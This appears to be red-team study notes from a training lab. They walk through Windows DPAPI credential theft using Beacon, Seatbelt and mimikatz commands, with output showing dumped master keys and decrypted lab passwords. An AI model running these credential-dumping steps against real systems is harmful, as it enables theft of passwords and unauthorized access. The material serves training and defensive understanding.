---
description: 09/17/2025
---

# ✅ Data Protection API (DPAPI)

## Motivation/What is it?

The Data Protection API (DPAPI) is a component built into Windows that provides a means for encrypting and decrypting data "blobs".

It uses cryptographic keys that are tied to either a specific user or computer and allows both native Windows functionality and third-party applications to protect/unprotect data transparently to the user.

DPAPI is used by the Windows Credential Manager to store saved secrets such as RDP credentials, and by third-party applications like Google Chrome to store website credentials.

## Credential Manager

Upon initially reading up about the Windows Credential Manager may end up being a bit confusing at first.

You're going to find both terms "Vaults" and "Credentials". So, what's the difference?

### Vaults

It essentially holds records of encrypted credentials and a reference to the encrypted blobs.

Windows has two vaults:

1. Web Credentials (for storing browser creds)
2. Windows Credentials (for storing credentials saved by `mstsc`, etc.)

### Credentials

This is the actual encrypted blob(s).

### Enumerating User's Vaults

To achieve this, we can use the <mark style="color:yellow;">`vaultcmd`</mark> tool.

```
beacon> run vaultcmd /list

Currently loaded vaults:
	Vault: Web Credentials
	Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
	Location: C:\Users\bfarmer\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

	Vault: Windows Credentials
	Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
	Location: C:\Users\bfarmer\AppData\Local\Microsoft\Vault

beacon> run vaultcmd /listcreds:"Windows Credentials" /all

Credentials in vault: Windows Credentials

Credential schema: Windows Domain Password Credential
Resource: Domain:target=TERMSRV/sql-2.dev.cyberbotic.io
Identity: SQL-2\Administrator
Hidden: No
Roaming: No
Property (schema element id,value): (100,2)
```

Another is to use <mark style="color:yellow;">`seatbelt`</mark> along with the <mark style="color:yellow;">`-group=user`</mark> parameter, or more specifically, the <mark style="color:yellow;">`WindowsVault`</mark> parameter!

```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

====== WindowsVault ======

  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials
  Item count     : 0

  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
  Vault Type     : Windows Credentials
  Item count     : 1
      SchemaGuid   : 3e0e35be-1b77-43e7-b873-aed901b6275b
      Resource     : String: Domain:target=TERMSRV/sql-2.dev.cyberbotic.io
      Identity     : String: SQL-2\Administrator
      PackageSid   : (null)
      Credential   : 
      LastModified : 9/6/2022 9:12:12 AM
```

Based on this, we now know that the user has saved credentials for the local administrator account on <mark style="color:yellow;">`SQL-2`</mark>. The encrypted credentials themselves are stored in the users' <mark style="color:yellow;">`\Credentials`</mark> directory.

```
beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
[*] Listing: C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 468b     fil     09/06/2022 10:34:22   6C33AC85D0C4DCEAB186B3B2E5B1AC7C
 10kb     fil     08/30/2022 08:42:59   DFBE70A7E5CC19A398EBF1B96859CE5D
```

<mark style="color:yellow;">`seatbelt`</mark> can also enumerate them using the <mark style="color:yellow;">`WindowsCredentialFiles`</mark> parameter.

```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles

====== WindowsCredentialFiles ======

  Folder : C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\

    FileName     : 6C33AC85D0C4DCEAB186B3B2E5B1AC7C
    Description  : Local Credential Data

    MasterKey    : bfc5090d-22fe-4058-8953-47f6882f549e
    Accessed     : 9/6/2022 10:50:44 AM
    Modified     : 9/6/2022 10:50:44 AM
    Size         : 468

    FileName     : DFBE70A7E5CC19A398EBF1B96859CE5D
    Description  : Local Credential Data

    MasterKey    : bfc5090d-22fe-4058-8953-47f6882f549e
    Accessed     : 9/6/2022 10:50:44 AM
    Modified     : 9/6/2022 10:50:44 AM
    Size         : 11036
```

{% hint style="info" %}
As of 09/17/2025, as far as I'm aware, there is no way to know which credential blob belong to which vault; and by extension, if a vault has multiple entries, which credential blob corresponds to which. This just ends with us having to decrypt each one in turn.
{% endhint %}

<mark style="color:yellow;">`seatbelt`</mark> also provides the GUID of the master key used to encrypt the credentials.

The master keys are stored in the users' roaming "Protect" directory. But guess what... they're also encrypted.

```
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104
[*] Listing: C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 740b     fil     08/15/2022 17:34:31   bfc5090d-22fe-4058-8953-47f6882f549e
 928b     fil     08/15/2022 17:34:31   BK-DEV
 24b      fil     08/15/2022 17:34:31   Preferred
```

_<mark style="color:yellow;">**So we must decrypt the master key first to obtain the actual AES128/256 encryption key and then use that key to decrypt the credentialed blob**</mark>_.&#x20;

**There are two ways of doing this:**

1. _**The first is only possible is you have local admin access on the machine and if the key is cached in LSASS**_. _<mark style="color:red;">**It will not be in the cache if the user has not recently accessed/decrypted the credential**</mark>_.

```
beacon> mimikatz !sekurlsa::dpapi

Authentication Id : 0 ; 1075454 (00000000:001068fe)
Session           : RemoteInteractive from 2
User Name         : bfarmer
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 9/6/2022 9:09:54 AM
SID               : S-1-5-21-569305411-121244042-2357301523-1104
	 [00000000]
	 * GUID      :	{bfc5090d-22fe-4058-8953-47f6882f549e}
	 * Time      :	9/6/2022 11:27:44 AM
------>	 * MasterKey :	8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
	 * sha1(key) :	897f7bf129e6a898ff4e20e9789009d5385be1f3
```

We can see that the <mark style="color:yellow;">GUID matches what we are looking for, so the key</mark><mark style="color:yellow;">`8d1539[...]19c214`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">is the one we need</mark>.

2. _**The second way**_ is to <mark style="color:yellow;">obtain the master key</mark> (<mark style="color:green;">which does not require elevation or interaction with LSASS</mark>). <mark style="color:yellow;">You must request it from the Domain Controller via the Microsoft BackupKey Remote Protocol (MS-BKRP)</mark>. This is designed as a failsafe in case a user changes their password or forgets it as well as supporting various smart card functionality.

```
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

[domainkey] with RPC
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
  key : 8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
  sha1: 897f7bf129e6a898ff4e20e9789009d5385be1f3
```

{% hint style="warning" %}
This will only work if executed in the context of the user who owns the key.  If your Beacon is running as another user or `SYSTEM`, you must impersonate the target user somehow first, then execute the command using the `@` modifier.
{% endhint %}

**Finally, the blob can then be decrypted:**

```
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214

  TargetName     : Domain:target=TERMSRV/sql-2.dev.cyberbotic.io
  UserName       : SQL-2\Administrator
  CredentialBlob : wIfY&cZ&d?QP9iMFEzckmj.34=@sg.*i
```

## Scheduled Task Credentials

_**Scheduled Tasks**_ <mark style="color:yellow;">can save credentials so that they can run under the context of a user without them having to be logged on</mark>.

{% hint style="info" %}
:bulb:

If we have local admin privileges on a machine, we can decrypt them in a similar fashion.
{% endhint %}

_The blobs are saved under_ <mark style="color:yellow;">`C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\`</mark> **(see below):**

```
beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 10kb     fil     08/30/2022 12:42:24   DFBE70A7E5CC19A398EBF1B96859CE5D
 528b     fil     08/16/2022 14:55:28   F3190EBE0498B77B4A85ECBABCA19B6E
```

<mark style="color:yellow;">**`dpapi::cred`**</mark>**&#x20;can tell us the&#x20;**<mark style="color:green;">**GUID of the master key used to encrypt each one**</mark>**:**

```
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

guidMasterKey      : {aaa23e6b-bba8-441d-923c-ec242d6690c3}
```

<mark style="color:yellow;">**`sekurlsa::dpapi`**</mark>**&#x20;to&#x20;**<mark style="color:green;">**dump cached keys**</mark>**:**

```
beacon> mimikatz !sekurlsa::dpapi

	 [00000000]
	 * GUID      :	{aaa23e6b-bba8-441d-923c-ec242d6690c3}
	 * Time      :	9/6/2022 12:14:38 PM
	 * MasterKey :	10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
	 * sha1(key) :	cfbc842e78ee6713fa5dcb3c9c2d6c6d7c09f06c
```

**And then&#x20;**<mark style="color:green;">**decrypt**</mark>**:**

```
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9

  TargetName     : Domain:batch=TaskScheduler:Task:{86042B87-C8D0-40A5-BB58-14A45356E01C}
  UserName       : DEV\jking
  CredentialBlob : Qwerty123
```
